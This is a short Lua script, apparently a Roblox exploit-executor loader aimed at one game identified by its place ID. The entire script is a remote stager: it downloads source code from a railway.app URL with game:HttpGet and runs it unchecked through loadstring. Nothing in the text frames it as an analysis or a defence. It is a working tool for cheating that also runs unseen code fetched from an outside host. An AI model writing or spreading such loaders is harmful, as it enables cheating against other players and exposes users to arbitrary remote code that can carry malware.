local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local PLACE_ID = 17625359962
local SCRIPT_URL = "https://railway-script-api-production.up.railway.app/script"

local function isRivals()
    return game.PlaceId == PLACE_ID
end

local function getScript()
    local ok, result = pcall(function()
        return game:HttpGet(SCRIPT_URL)
    end)

    if not ok or type(result) ~= "string" or #result == 0 then
        return nil
    end

    return result
end

local function execute(source)
    local compiler = loadstring
    if type(compiler) ~= "function" then
        return false
    end

    local ok, fn = pcall(compiler, source)
    if not ok or type(fn) ~= "function" then
        return false
    end

    local success = pcall(fn)
    return success
end

if not isRivals() then
    return
end

local source = getScript()
if not source then
    return
end

execute(source)
